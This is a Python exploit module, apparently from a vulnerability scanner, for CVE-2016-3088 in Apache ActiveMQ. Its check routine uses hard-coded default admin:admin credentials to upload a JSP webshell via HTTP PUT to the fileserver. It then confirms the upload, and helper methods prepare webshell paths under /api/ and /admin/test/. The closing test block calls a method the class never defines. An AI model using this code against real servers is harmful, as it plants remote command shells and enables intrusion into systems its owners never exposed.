#!/usr/bin/env python3

import asyncio
from app.lib.common import get_useragent
from app.lib.request import request

class CVE_2016_3088_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'CVE-2016-3088漏洞',
            'description': 'CVE-2016-3088漏洞可上传文件,上传shell需要账号密码,在headers中Authorization设置,影响范围为: Apache ActiveMQ 5.x ~ 5.14.0',
            'date': '2016-03-10',
            'exptype': 'check',
            'type': 'File Upload'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.put_file_path = "/fileserver/tmp_2016.txt"
        self.local_shell_path = ""
        self.move_shell_path = ""
        self.get_install_path_url = []
        self.install_path = ""
        self.webshell_path_list = []
        self.headers = {
            "User-Agent": get_useragent(),
            "Authorization": "Basic YWRtaW46YWRtaW4="
        }

        with open('app/static/cmd_jsp.jsp', 'r', encoding = 'utf-8') as reader:
            self.webshell_content = reader.read()

    def init_shell_fie(self, tmp_file_name):

        """
        初始化一些文件路径

        :param str tmp_file_name: 上传的文件名字

        :return:
        """
        
        self.put_file_path = "/fileserver/" + tmp_file_name + ".txt"
        webshell_path_one = "/api/" + tmp_file_name + ".jsp"
        webshell_path_two = "/admin/test/" + tmp_file_name + ".jsp"
        # 在两个地方写shell
        self.webshell_path_list.append(webshell_path_one)
        self.webshell_path_list.append(webshell_path_two)

    async def checkfile(self, file_path):

        """
        检查文件路径是否存在

        :param str file_path: 文件路径

        :return bool True or False: 是否存在路径
        """

        try:
            req = await request.get(file_path, headers = self.headers)
            if req.status == 200 or req.status != 404:
                return True
        except Exception as e:
            # print(e)
            pass

    def deal_path(self, install_path):

        """
        根据系统来获取真实的安装路径

        :param str install_path: 安装路径

        :return str real_install_path: 处理后的真实安装路径
        """

        real_install_path = ""
        tmppath = install_path
        # linux系统
        if ":" not in install_path:
            real_install_path = tmppath
        # win系统
        else:
            tmp_list = tmppath.split("\\")
            range_index = len(tmp_list) - (tmppath.count("..")*2)
            for k in range(0, range_index):
                real_install_path = real_install_path + "\\"+tmp_list[k]
            real_install_path = real_install_path[1:]
        # print "real_install_path = "+real_install_path
        return real_install_path

    async def check(self):
        
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """

        try:
            self.put_file_path = self.url + self.put_file_path
            await request.put(self.put_file_path, headers = self.headers, data = self.webshell_content)
            await asyncio.sleep(2)
            if (await self.checkfile(self.put_file_path)):
                return True
            
        except Exception as e:
            # print(e)
            pass

if __name__ == '__main__':
    CVE_2016_3088 = CVE_2016_3088_BaseVerify('http://127.0.0.1:8161')
    print(CVE_2016_3088.webshell('sd'))
